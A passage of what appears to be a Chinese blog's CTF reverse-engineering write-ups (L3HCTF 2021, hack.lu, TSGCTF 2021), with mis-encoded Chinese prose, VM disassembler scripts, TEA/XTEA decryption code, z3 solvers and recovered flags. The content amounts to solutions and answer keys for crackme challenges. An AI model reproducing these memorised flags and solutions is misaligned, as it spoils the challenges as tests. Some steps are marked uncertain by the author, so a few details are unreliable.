BINARY_TRUE_DIVIDE 27 def_op(\u0026#39;BINARY_AND\u0026#39;, 63) #define BINARY_RSHIFT 63 def_op(\u0026#39;BINARY_XOR\u0026#39;, 62) #define BINARY_LSHIFT 62 def_op(\u0026#39;BINARY_OR\u0026#39;, 64) #define BINARY_AND 64 def_op(\u0026#39;INPLACE_POWER\u0026#39;, 67) def_op(\u0026#39;GET_ITER\u0026#39;, 68) def_op(\u0026#39;GET_YIELD_FROM_ITER\u0026#39;, 69) def_op(\u0026#39;PRINT_EXPR\u0026#39;, 70) def_op(\u0026#39;LOAD_BUILD_CLASS\u0026#39;, 71) def_op(\u0026#39;YIELD_FROM\u0026#39;, 72) def_op(\u0026#39;GET_AWAITABLE\u0026#39;, 73) def_op(\u0026#39;INPLACE_LSHIFT\u0026#39;, 75) def_op(\u0026#39;INPLACE_RSHIFT\u0026#39;, 76) def_op(\u0026#39;INPLACE_AND\u0026#39;, 77) def_op(\u0026#39;INPLACE_XOR\u0026#39;, 78) def_op(\u0026#39;INPLACE_OR\u0026#39;, 79) def_op(\u0026#39;BREAK_LOOP\u0026#39;, 80) def_op(\u0026#39;WITH_CLEANUP_START\u0026#39;, 81) def_op(\u0026#39;WITH_CLEANUP_FINISH\u0026#39;, 82) def_op(\u0026#39;RETURN_VALUE\u0026#39;, 83) def_op(\u0026#39;IMPORT_STAR\u0026#39;, 84) def_op(\u0026#39;YIELD_VALUE\u0026#39;, 86) def_op(\u0026#39;POP_BLOCK\u0026#39;, 87) def_op(\u0026#39;END_FINALLY\u0026#39;, 88) def_op(\u0026#39;POP_EXCEPT\u0026#39;, 89) HAVE_ARGUMENT = 90 name_op(\u0026#39;STORE_NAME\u0026#39;, 90) name_op(\u0026#39;DELETE_NAME\u0026#39;, 91) def_op(\u0026#39;UNPACK_SEQUENCE\u0026#39;, 92) jrel_op(\u0026#39;FOR_ITER\u0026#39;, 93) def_op(\u0026#39;UNPACK_EX\u0026#39;, 94) name_op(\u0026#39;STORE_ATTR\u0026#39;, 95) name_op(\u0026#39;DELETE_ATTR\u0026#39;, 96) name_op(\u0026#39;STORE_GLOBAL\u0026#39;, 97) name_op(\u0026#39;DELETE_GLOBAL\u0026#39;, 98) def_op(\u0026#39;LOAD_CONST\u0026#39;, 100) hasconst.append(100) name_op(\u0026#39;LOAD_NAME\u0026#39;, 101) def_op(\u0026#39;BUILD_TUPLE\u0026#39;, 102) def_op(\u0026#39;BUILD_LIST\u0026#39;, 103) def_op(\u0026#39;BUILD_SET\u0026#39;, 104) def_op(\u0026#39;BUILD_MAP\u0026#39;, 105) name_op(\u0026#39;LOAD_ATTR\u0026#39;, 106) def_op(\u0026#39;COMPARE_OP\u0026#39;, 107) hascompare.append(107) name_op(\u0026#39;IMPORT_NAME\u0026#39;, 108) name_op(\u0026#39;IMPORT_FROM\u0026#39;, 109) jrel_op(\u0026#39;JUMP_FORWARD\u0026#39;, 110) jabs_op(\u0026#39;JUMP_IF_FALSE_OR_POP\u0026#39;, 112) jabs_op(\u0026#39;JUMP_IF_TRUE_OR_POP\u0026#39;, 111) jabs_op(\u0026#39;JUMP_ABSOLUTE\u0026#39;, 113) jabs_op(\u0026#39;POP_JUMP_IF_FALSE\u0026#39;, 114) jabs_op(\u0026#39;POP_JUMP_IF_TRUE\u0026#39;, 115) name_op(\u0026#39;LOAD_GLOBAL\u0026#39;, 116) jabs_op(\u0026#39;CONTINUE_LOOP\u0026#39;, 119) jrel_op(\u0026#39;SETUP_LOOP\u0026#39;, 120) jrel_op(\u0026#39;SETUP_EXCEPT\u0026#39;, 121) jrel_op(\u0026#39;SETUP_FINALLY\u0026#39;, 122) def_op(\u0026#39;LOAD_FAST\u0026#39;, 124) haslocal.append(124) def_op(\u0026#39;STORE_FAST\u0026#39;, 125) haslocal.append(125) def_op(\u0026#39;DELETE_FAST\u0026#39;, 126) haslocal.append(126) def_op(\u0026#39;RAISE_VARARGS\u0026#39;, 130) def_op(\u0026#39;CALL_FUNCTION\u0026#39;, 131) hasnargs.append(131) def_op(\u0026#39;MAKE_FUNCTION\u0026#39;, 132) def_op(\u0026#39;BUILD_SLICE\u0026#39;, 133) def_op(\u0026#39;MAKE_CLOSURE\u0026#39;, 134) def_op(\u0026#39;LOAD_CLOSURE\u0026#39;, 135) hasfree.append(135) def_op(\u0026#39;LOAD_DEREF\u0026#39;, 136) hasfree.append(136) def_op(\u0026#39;STORE_DEREF\u0026#39;, 137) hasfree.append(137) def_op(\u0026#39;DELETE_DEREF\u0026#39;, 138) hasfree.append(138) def_op(\u0026#39;CALL_FUNCTION_VAR\u0026#39;, 140) hasnargs.append(140) def_op(\u0026#39;CALL_FUNCTION_KW\u0026#39;, 141) hasnargs.append(141) def_op(\u0026#39;CALL_FUNCTION_VAR_KW\u0026#39;, 142) hasnargs.append(142) jrel_op(\u0026#39;SETUP_WITH\u0026#39;, 143) def_op(\u0026#39;LIST_APPEND\u0026#39;, 145) def_op(\u0026#39;SET_ADD\u0026#39;, 146) def_op(\u0026#39;MAP_ADD\u0026#39;, 147) def_op(\u0026#39;LOAD_CLASSDEREF\u0026#39;, 148) hasfree.append(148) jrel_op(\u0026#39;SETUP_ASYNC_WITH\u0026#39;, 154) def_op(\u0026#39;EXTENDED_ARG\u0026#39;, 144) EXTENDED_ARG = 144 def_op(\u0026#39;BUILD_LIST_UNPACK\u0026#39;, 149) def_op(\u0026#39;BUILD_MAP_UNPACK\u0026#39;, 150) def_op(\u0026#39;BUILD_MAP_UNPACK_WITH_CALL\u0026#39;, 151) def_op(\u0026#39;BUILD_TUPLE_UNPACK\u0026#39;, 152) def_op(\u0026#39;BUILD_SET_UNPACK\u0026#39;, 153) del def_op del name_op del jrel_op del jabs_op è¿™ä¸‹å°±å¾ˆèˆ’æœäº†ï¼ˆå¦‚æœå…¨éƒ½æ”¹ä¹±äº†ï¼Œå°±å¾—å†™ä¸ªè„šæœ¬å…¨æ”¹å›å»äº†ï¼Œä¸è¿‡è¿™æ ·çš„è¯è¿™ä¸ªç¨‹åºæ˜¯ä¸æ˜¯ä¹Ÿçœ‹ä¸æ‡‚äº†ï¼‰\n[L3HCTF 2021]double-joy æ¢å¤jmpè¡¨ï¼Œå‘ç°æ˜¯ä¸ªvmï¼Œå†™ä¸€ä¸‹åæ±‡ç¼–\nopcode = [] i = 0 index = 0 while i \u0026lt; len_op: if i \u0026gt; 590: break cur_op = opcode[i] if cur_op == 0: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] += memory[{index}]\u0026#34;) i += 1 elif cur_op == 1: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] = memory[{index}] - memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 2: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] *= memory[{index}]\u0026#34;) i += 1 elif cur_op == 3: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] = memory[{index}] / memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 4: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] %= memory[{index}] % memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 5: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] \u0026amp;= memory[{index}]\u0026#34;) i += 1 elif cur_op == 6: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] |= memory[{index}]\u0026#34;) i += 1 elif cur_op == 7: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] ^= memory[{index}]\u0026#34;) i += 1 elif cur_op == 8: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[memory[{index-2}]] = memory[{index-1}]\u0026#34;) # print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;index -= 2\u0026#34;) index = index - 2 i += 1 elif cur_op == 9: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = memory[memory[{index - 1}]]\u0026#34;) i += 1 elif cur_op == 10: #å’Œcase 11çš„æƒ…å†µä¸€æ · print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = (1 if memory[{index - 1}] == 0 else 0)\u0026#34;) i += 1 elif cur_op == 11: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = (1 if memory[{index - 1}] \u0026lt; 0 else 0)\u0026#34;) i += 1 elif cur_op == 12: #è¿™ä¸ªå†ä»”ç»†çœ‹çœ‹ï¼Œä¸ç¡®å®šæ€§æœ‰ç‚¹é«˜ï¼Œè„‘è¢‹æœ‰ç‚¹ç³Š print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}], memory[{index - 2}] = memory[{index - 2}], memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 13: print(\u0026#34;%04x: \u0026#34; % i, \u0026#34;index -= 1 # index = {index}\u0026#34;) index -= 1 i += 1 elif cur_op == 14: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index}] = {int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}\u0026#34;) # print (\u0026#34;%04x: \u0026#34; % i, \u0026#34;i += 5\u0026#34;) index += 1 i += 5 elif cur_op == 15: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;i = {hex((int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) + i + 5) \u0026amp; 0xffffffff)}\u0026#34;) # i = int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) + i + 5 i += 5 elif cur_op == 16: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;i += 5 + ({int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)} if memory[{index - 1}] != 0 else 0)\u0026#34;) index = index - 1 i += 5 elif cur_op == 17: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;index += {int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}\u0026#34;) # print(\u0026#34;%04x i += 5\u0026#34; % i) index += int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) i += 5 elif cur_op == 18: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;return (memory[{int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}])\u0026#34;) i += 5 else: print (\u0026#34;Error @ %04x\u0026#34; % i) åŠ¨è°ƒå‘ç°ï¼Œæ€»å…±æœ‰ä¸¤ä¸ªvmï¼Œflagçš„å†…å­˜è¢«å…±äº«ï¼Œå…¶ä»–çš„çŠ¶æ€åˆ†åˆ«ä¿ç•™ï¼Œä¸¤ä¸ªvmä¾æ¬¡æ‰§è¡Œï¼ˆèƒ½çœ‹åˆ°ä¸­é—´æŸä¸ªå¾ªç¯æœ«å°¾æœ‰ä¸ªreturnï¼‰åˆ†åˆ«æ˜¯xteaåŠ å¯†å’ŒteaåŠ å¯†ï¼Œç›¸å½“äºåŒæ—¶è¿›è¡Œxteaå’ŒteaåŠ å¯†äº†å†™ä¸ªæ±‚è§£è„šæœ¬\néœ€è¦æ³¨æ„æ˜¯ç¨‹åºä¸­ä¸ºintç±»å‹ï¼Œè¿ç®—éœ€è¦å’Œé¢˜ç›®ä¸­çš„ä¸€è‡´ï¼ˆä¸èƒ½ç”¨ä½è¿ç®—ï¼‰\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void decipher(int32_t* v) { unsigned int i; int const xtea_k[4] = {18764, 28534, 25888, 17237}; int v0, v1, xtea_delta=123456789, xtea_sum=987654321 + xtea_delta * 100; int tea_k[4] = {21332, 20301, 8308, 25953}; int tea_delta=22334455; /* a key schedule constant */ int tea_sum=1592647341 + tea_delta * 100; /* set up */ for (int j = 8; j \u0026gt;= 0; j -= 2){ v0 = v[j]; v1 = v[j + 1]; for (i = 0; i \u0026lt; 20; i++) { v1 -= ((v0\u0026lt;\u0026lt;4) + tea_k[2]) ^ (v0 + tea_sum) ^ ((v0 / 32) + tea_k[3]); v0 -= ((v1\u0026lt;\u0026lt;4) + tea_k[0]) ^ (v1 + tea_sum) ^ ((v1 / 32) + tea_k[1]); tea_sum -= tea_delta; if (i == 19 \u0026amp;\u0026amp; j == 0){ v0 ^= 0x1010101; v1 ^= 0x1010101; } v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 / 32)) + v0) ^ (xtea_sum + xtea_k[(xtea_sum / 2048) \u0026amp; 3]); xtea_sum -= xtea_delta; v0 -= (((v1 *16 ) ^ (v1 / 32)) + v1) ^ (xtea_sum + xtea_k[xtea_sum \u0026amp; 3]); if (i == 19 \u0026amp;\u0026amp; j == 0){ v0 ^= 0x1010101; v1 ^= 0x1010101; } } /* end cycle */ v[j]=v0; v[j + 1]=v1; } } int main(){ int v[10] = {0xAEE0FAE8, 0xFC3E4101, 0x167CAD92, 0x51EA6CBE, 0x242A0100, 0x1511A1B, 0x514D6694, 0x2F5FBFEB, 0x46D36398, 0x79EEE3F0}; decipher(v); for (int i = 0; i \u0026lt; 10; i+=2) printf(\u0026#34;%x %x\\n\u0026#34;,v[i],v[i + 1]); return 0; } // [0x6c427530, 0x4d765f65, 0x7431575f, 0x4f645f68, 0x65496275, 0x4145545f, 0x7d] // L3HCTF{D0uBle_vM_W1th_dOubIe_TEA} // ç¬¬ä¸€ç»„å¤±è´¥äº†ï¼ŒçŒœæµ‹æ˜¯flagå¤´å’ŒD [L3HCTF 2021]Load è¿™é¢˜ä½¿ç”¨äº†è¿›ç¨‹é•‚ç©ºæŠ€æœ¯ï¼ˆæ‰¾æ—¶é—´ç ”ç©¶å®¤ä¸€ä¸‹è¿™ä¸€ç³»åˆ—çš„æŠ€æœ¯ï¼‰ï¼Œéœ€è¦å…ˆæŠŠPEæ–‡ä»¶æå–å‡ºæ¥\nåŠ¨è°ƒè¿›å…¥é•‚ç©ºçš„å‡½æ•°ï¼Œä¼šå‘ç°ä¸€ä¸ªå¯¹PEçš„æ¯”è¾ƒï¼Œç½‘ä¸Šæ‰¾å¯ä»¥æ‰¾åˆ°MZå¤´ï¼ˆnameå­—ç¬¦ä¸²ä¸‹é¢ï¼‰ï¼Œdumpä¸‹æ¥å³å¯\nåˆ†æPE\né¦–å…ˆæå–äº†flagçš„ä¸­é—´éƒ¨åˆ†ï¼Œéšåå°†å…¶ä¸¤ä¸¤ä¸€ç»„è½¬åŒ–æˆ16è¿›åˆ¶ï¼Œå…±13å­—èŠ‚\n401070å‡½æ•°æ˜¯å°†13å­—èŠ‚æ‹†æˆ9å’Œ4å­—èŠ‚åˆ†åˆ«å­˜å…¥srcå’Œv27ï¼Œåˆ†åˆ«æ˜¯33å’Œ22çš„çŸ©é˜µ\n401370å‡½æ•°è¾ƒå¤§ï¼Œä¸”è°ƒç”¨äº†ä¸€ä¸ªé€’å½’å‡½æ•°\nv11 = mul_matrix_4012A0(v17, v6) * a1[v5]; if ( (v5 \u0026amp; 1) != 0 ) v4 -= v11; else v4 += v11; åˆ†æå‘ç°å‡½æ•°è®¡ç®—é€’å½’åä¸ç¬¬ä¸€è¡Œçš„ä¸€ä¸ªæ•°å­—ç›¸ä¹˜ï¼Œå¹¶æ ¹æ®å¥‡å¶è¿›è¡ŒåŠ æ³•å’Œå‡æ³•ï¼Œé‡å†™è¯¥å‡½æ•°å¹¶éªŒè¯åå‘ç°æ˜¯æ±‚è§£çŸ©é˜µè¡Œåˆ—å¼\nå†åˆ†æ401370å‡½æ•°æ—¶å‘ç°ï¼Œå‡½æ•°ä½¿ç”¨äº†ä¸€ä¸ªæ•°å­—é™¤ä»¥è¡Œåˆ—å¼ï¼ŒçŒœæµ‹æ˜¯ç”¨æ¥æ±‚è§£é€†çŸ©é˜µçš„\nè°ƒç”¨å®Œ401370åå°±æ˜¯éªŒè¯éƒ¨åˆ†ï¼Œåªéœ€è¦æ»¡è¶³æ‰€æœ‰ç­‰å¼å³å¯\nä½¿ç”¨åœ¨çº¿ç½‘ç«™æ±‚è§£é€†çŸ©é˜µ\nflag = [-8, 18, -9, 6, -13, 6, -1, 2, -1, 13, -3, -30, 7] for f in flag: print (\u0026#39;%02x\u0026#39; % (f \u0026amp; 0xff), end=\u0026#39;\u0026#39;) # f812f706f306ff02ff0dfde207 [hack.lu]pycoin å…ˆä½¿ç”¨uncompyle6åç¼–è¯‘ï¼Œå‘ç°æ‰§è¡Œäº†ä¸€ä¸²marshalå­—èŠ‚ç \nå°†è¯¥å­—èŠ‚ç è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œç„¶åæ ¹æ®é¢˜ç›®ç»™çš„pycè¡¥å…¨æ–‡ä»¶å¤´\nå†æ¬¡åç¼–è¯‘å‘ç°æœ‰èŠ±æŒ‡ä»¤ï¼Œå¼€å¤´å’Œä¸­é—´å„æœ‰ä¸€ä¸ª jump_forwardï¼Œä¸­é—´è¿˜æœ‰ä¸¤ä¸ªè¿ç»­çš„ rot_tow\nè¿™é‡Œå°è¯•äº†ä¸€ä¸‹æ–°çš„patchæ–¹æ³•ï¼šå°†èŠ±æŒ‡ä»¤å…¨æ›¿æ¢æˆnopï¼Œä½†è¯¥æ–¹æ³•çš„é—®é¢˜åœ¨äºåªèƒ½ä½¿ç”¨pycdcè¿›è¡Œåç¼–è¯‘ï¼Œå¹¶ä¸æ”¯æŒuncompyle6\nä¸ªäººæ„Ÿè§‰uncompyle6åç¼–è¯‘æ•ˆæœæ›´å¥½ï¼Œä½†é€‚ç”¨çš„ç‰ˆæœ¬èŒƒå›´æ›´çª„ï¼Œ3.7åŠä¹‹å‰çš„ç‰ˆæœ¬è¾ƒä¸ºåˆé€‚ pycdcä¸€ç›´æ›´æ–°æœ€æ–°ç‰ˆæœ¬ï¼Œä½†åç¼–è¯‘æ•ˆæœè¾ƒå·®ï¼Œè€Œä¸”åœ¨ç»†èŠ‚ä¸Šå®¹æ˜“å‡ºé—®é¢˜ï¼Œæ–°ç‰ˆæœ¬åªèƒ½ä½¿ç”¨pycdcï¼Œä½†æœ€å¥½ç»“åˆpycdasçš„ç»“æœè¿›è¡Œåˆ†æ\nå¦ä¸€ç§ä¼ ç»Ÿçš„patchæ–¹æ³•å°±è¡ŒæŠŠopcodeå»æ‰ï¼Œç„¶åæŠŠæ‰€æœ‰jmpä¿®æ”¹åˆ°æ­£ç¡®ä½ç½®\npatchåçš„ç»“æœå¦‚ä¸‹ï¼š\næœ€ååç¼–è¯‘çš„ç»“æœä¸º\nfrom hashlib import md5 k = str(input(\u0026#39;please supply a valid key:\u0026#39;)).encode() correct = len(k) == 16 and k[0] == 102 and k[1] == k[0] + 6 and k[2] == k[1] - k[0] + 91 and k[3] == 103 and k[4] == k[11] * 3 - 42 and k[5] == sum(k) - 1322 and k[6] + k[7] + k[10] == 260 and int(chr(k[7]) * 2) + 1 == k[9] and k[8] % 17 == 16 and k[9] == k[8] * 2 and md5(k[10] * b\u0026#39;a\u0026#39;).digest()[0] - 1 == k[3] and k[11] == 55 and k[12] == k[14] / 2 - 2 and k[13] == k[10] * k[8] % 32 * 2 - 1 and k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23 and k[15] == 125 print(f\u0026#34;valid key! {k.decode()}\u0026#34; if correct else \u0026#39;invalid key :(\u0026#39;) ç„¶åä¸€ä¸ªz3å°±å®Œäº‹ï¼ˆtm k[5]çº¦æŸäº†ä¸ªå¯‚å¯ï¼‰\nfrom z3 import * s = Solver() k = [BitVec(\u0026#39;k%d\u0026#39; % i, 8) for i in range(16)] s.add(k[0] == 102) s.add(k[1] == k[0] + 6) s.add(k[2] == (k[1] - k[0]) + 91) s.add(k[3] == 103) s.add(k[4] == k[11] * 3 - 42) s.add(k[11] == 55) s.add(k[10] == 101) s.add(k[15] == 125) s.add(k[5] == sum(k) - 1322) s.add(k[6] + k[7] + k[10] == 260) s.add(k[7] \u0026gt; 0x30) s.add(k[7] \u0026lt; 0x40) s.add((k[7] - 0x30) * 11 + 1 == k[9]) s.add(k[8] % 17 == 16) s.add(k[9] == k[8] * 2) s.add(k[12] == k[14] / 2 - 2) s.add(k[13] == (k[10] * k[8] % 32) * 2 - 1) s.add(k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23) if s.check(): model = s.model() for i in range(16): if i == 5: # è¿™ä¸ªä½ç½®æ ¹æœ¬æ²¡æœ‰çº¦æŸï¼Œæœ€åå®˜æ–¹ç›´æ¥ç»™å‡ºæ¥äº† continue print (chr(model[k[i]].as_long()), end=\u0026#39;\u0026#39;) else: print (\u0026#34;No result\u0026#34;) [hack.lu]atareee atareee.atstate2 æ˜¯å†…å­˜çŠ¶æ€ï¼Œå¯¹å…¶è¿›è¡Œbinwalkï¼Œå¯ä»¥å¾—åˆ° memory.bin å’Œ savestate.json æ–‡ä»¶\næ ¹æ®åˆ†æå¯ä»¥å¾—çŸ¥æ˜¯ 6052 æ¶æ„ï¼Œç”¨Ghidraæ‰“å¼€ï¼Œæ ¹æ®é¢˜ç›®ä¸­æç¤ºçš„ @061A æ‰¾åˆ°éªŒè¯é€»è¾‘çš„åœ°å€\nåŠ å¯†å‡½æ•°å’ŒéªŒè¯å‡½æ•°å¦‚ä¸‹ï¼š\nvoid FUN_529e(void) { byte bVar1; byte bVar2; byte bVar3; byte in_C; bVar3 = 0; do { write_1(PORTA,bVar3); bVar1 = read_1(PORTA); if ((bVar1 \u0026amp; 1) == 0) { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_50c2[bVar3] ^ BYTE_ARRAY_50c2[(byte)(bVar3 + 1)]; bVar2 = read_1(PORTA); BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_5234[bVar3]; bVar1 = BYTE_ARRAY_5234[bVar3]; BYTE_ARRAY_5234[bVar3] = bVar1 \u0026lt;\u0026lt; 1 | CARRY1(bVar2,BYTE_ARRAY_50c2[bVar3]); } else { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_50c2[bVar3] ^ BYTE_ARRAY_5219[(byte)(bVar3 - 1) + 1]; bVar1 = BYTE_ARRAY_5234[bVar3]; BYTE_ARRAY_5234[bVar3] = bVar1 \u0026lt;\u0026lt; 1 | in_C; } if ((bool)(bVar1 \u0026gt;\u0026gt; 7)) { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_5234[bVar3] + \u0026#39;\\x01\u0026#39;; } bVar3 = bVar3 + 1; in_C = 0x19 \u0026lt; bVar3; } while (bVar3 != 0x1a); return; } undefined FUN_52e8(void) { byte bVar1; bVar1 = 0; do { if (BYTE_ARRAY_5200[bVar1] != BYTE_ARRAY_5234[bVar1]) { FUN_531d(); bVar1 = 0; do { BYTE_ARRAY_509a[bVar1] = s__NICE_TRY,_MAYBE_NEXT_TIME_ITS_C_5276[bVar1]; bVar1 = bVar1 + 1; } while (bVar1 != 0x28); return 0; } bVar1 = bVar1 + 1; } while (bVar1 != 0x1a); bVar1 = 0; do { BYTE_ARRAY_509a[bVar1] = s__GOOD_JOB!_ENJOY_THOSE_REVERSING_524e[bVar1]; bVar1 = bVar1 + 1; } while (bVar1 != 0x28); return 0; } é€šè¿‡ä¿®æ”¹ savestate.json çš„PCä½ç½®ï¼ˆEIPï¼‰å³å¯è¿›è¡ŒåŠ¨è°ƒï¼Œå‘ç°è¾“å…¥è¢«å­˜å…¥ 50c2 ä¸­ï¼Œå¤ç°è¯¥å‡½æ•°å¹¶çˆ†ç ´å³å¯å¾—åˆ°flag\ntarget = [ 0x14, 0x1E, 0xC, 0xE0, 0x30, 0x5C, 0xCE, 0xF0, 0x36, 0xAE, 0xFC, 0x39, 0x1A, 0x91, 0xCE, 0xB4, 0xC4, 0xE, 0x18, 0xF3, 0xC8, 0x8E, 0xA, 0x85, 0xF6, 0xbd ] array_50c2 = [ 0xD9, 0x50, 0x48, 0xB9, 0xD8, 0x50, 0x48, 0x60, 0x46, 0x54, 0x43, 0x44, 0x45, 0x49, 0x50, 0x55, 0x52, 0x53, 0x4C, 0x47, 0x58, 0x51, 0xF3, 0x50, 0x8, 0x51, 0x10 ] array_5219 = [ 0xBD, 0x43, 0x11, 0x37, 0xF2, 0x69, 0xAB, 0x2C, 0x99, 0x13, 0x12, 0xD1, 0x7E, 0x9A, 0x8F, 0xE, 0x92, 0x37, 0xF4, 0xAA, 0x4D, 0x77, 0x3, 0x89, 0xCA, 0xFF, ] array_5234 = [0 for _ in range(0x1a)] in_C = 0 j = 0 for i in range(0x19, -1, -1): in_C = 1 if (0x19 \u0026lt; i + 1) else 0 for j in range(0x30, 0x60): array_50c2[i] = j var1 = i var2 = 0 if var1 \u0026amp; 1 == 0: array_5234[i] = array_50c2[i] ^ array_50c2[i + 1] var2 = i var1 = array_5234[i] array_5234[i] = ((var1 \u0026lt;\u0026lt; 1) | ((array_50c2[i] + i) \u0026gt;\u0026gt; 7)) \u0026amp; 0xff else: array_5234[i] = array_50c2[i] ^ array_5219[i] var1 = array_5234[i] array_5234[i] = ((var1 \u0026lt;\u0026lt; 1) | in_C) \u0026amp; 0xff if var1 \u0026gt;\u0026gt; 7 != 0: array_5234[i] = array_5234[i] + 1 if array_5234[i] == target[i]: print (chr(j), end= \u0026#39;\u0026#39;) break else: print (\u0026#34;no\u0026#34;) ","date":"2021-11-23T14:06:23Z","permalink":"/post/resent-re-challenge/","title":"Resent RE Challenge"},{"content":"TSGCTF2021 Beginners Rev ç”¨ fork() éå†äº† 32 ä½è¾“å…¥ï¼Œæ¯ä¸ªè¾“å…¥éƒ½åˆ†åˆ«è¿›è¡Œä¸€æ¬¡å‡½æ•°è¿ç®—\ndo { ++v2; if ( !fork() ) { v2 = 0; v1 |= 1 \u0026lt;\u0026lt; v3; v7 = open(\u0026#34;/dev/null\u0026#34;, 1); dup2(v7, 1); } ++v3; } while ( v3 != 5 ); æ¯ä¸ªå‡½æ•°è¿ç®—éƒ½æ˜¯å°†è¾“å…¥è¿­ä»£å¥½å¤šæ¬¡\nv4 = (unsigned __int8 *)\u0026amp;key + a2; v5 = v4[2]; v6 = 1; while ( (unsigned int)(-1217102449 * v5 + 1217102449) \u0026gt; 0xB2927C ) { ++v6; v5 += v4[2]; if ( v6 == 367 ) { v6 = -1; break; } } v7 = v4[4]; v8 = v4[3] * ((a1 + *v4) % 367 * v4[1] % 367 * v6 % 367) % 367; è¢«retaddrå‘äº†ä¸€ä¼šï¼Œåé¢æ‰ååº”è¿‡æ¥å¼€å¤´é‚£ä¸ª if ( retaddr - (_BYTE *)check != 95 ) çš„æ„æ€\nè§£æ³•å°±æ˜¯å…ˆå°†whileå¾ªç¯å†…çš„è¿ç®—è§£å‡ºæ¥ï¼Œç„¶åç”¨z3æ±‚è§£å°±è¡Œ\nfrom z3 import * key = [ 0x9E, 0xA5, 0x43, 0x3C, 0x3D, 0xE5, 0x50, 0x95, 0x29, 0xFB, 0x03, 0x34, 0xF6, 0x6D, 0xF7, 0x9A, 0x5E, 0x8A, 0x6F, 0x0F, 0xAE, 0x6A, 0x78, 0x41, 0x02, 0x46, 0x8B, 0xAE, 0xB6, 0x83, 0x09, 0x4F, 0x54, 0x74, 0x8D, 0xF4, 0x79, 0xD2, 0xFE, 0x2D, 0x78, 0x1B, 0x11, 0x57, 0xB7, 0x9F, 0x4E, 0xC4, 0x52, 0x9E, 0xF5, 0xFF, 0x56, 0x71, 0x3C, 0x1B, 0x60, 0x22, 0x9C, 0x56, 0xA7, 0xCF, 0x8E, 0x45, 0x16, 0x5C, 0xA5, 0xF4, 0x28, 0xA0, 0x30, 0x57, 0xA5, 0xB1, 0xC9, 0xC4, 0x86, 0x3E, 0xB8, 0x13, 0x44, 0x4D, 0xBF, 0x97, 0xE4, 0x06, 0x96, 0x07, 0x8B, 0x9F, 0x52, 0x12, 0x92, 0xC6, 0xC0, 0x8A, 0x69, 0xF5, 0xA5, 0x9D, 0xF3, 0x3B, 0xB6, 0x99, 0x86, 0xD9, 0x67, 0x32, 0xB1, 0xBF, 0xB8, 0x2E, 0x58, 0x55, 0xB0, 0x9C, 0x65, 0x9E, 0x9F, 0xE3, 0xF0, 0xBF, 0xCF, 0xCD, 0xDE, 0xFD, 0x34, 0x31, 0x78, 0x55, 0x6E, 0x01, 0x74, 0xD7, 0xA8, 0x26, 0xFF, 0xD6, 0xCC, 0x99, 0x51, 0xFB, 0xF6, 0xF4, 0x03, 0xFA, 0x61, 0xDF, 0x41, 0x98, 0x0D, 0xBD, 0xBF, 0x88, 0x44, 0x5E, 0x56, 0xD2, 0xA9, 0x00 ] time = [ 0x127, 0x0ee, 0x07e, 0x068, 0x169, 0x0f2, 0x04e, 0x0ea, 0x0bc, 0x0ae, 0x0f5, 0x078, 0x114, 0x10a, 0x13b, 0x0ff, 0x052, 0x07d, 0x0cd, 0x031, 0x0fb, 0x142, 0x034, 0x060, 0x0b8, 0x0c2, 0x12d, 0x0fb, 0x0f4, 0x161, 0x0cc, 0x0df, 0x11c, 0x0c1, 0x0b1, 0x0b6, 0x05b, 0x0bb, 0x162, 0x105, 0x034, 0x044, 0x06c, 0x087, 0x16d, 0x151, 0x050, 0x117, 0x05e, 0x127, 0x003, 0x09a, 0x12f, 0x00d, 0x068, 0x044, 0x041, 0x036, 0x028, 0x12f, 0x0bd, 0x148, 0x0a8, 0x0fa, 0x13d, 0x004, 0x0ee, 0x0b6, 0x09c, 0x027, 0x082, 0x087, 0x0ee, 0x08d, 0x02a, 0x117, 0x03f, 0x094, 0x002, 0x03a, 0x01b, 0x08f, 0x062, 0x0af, 0x042, 0x132, 0x073, 0x069, 0x12d, 0x151, 0x05e, 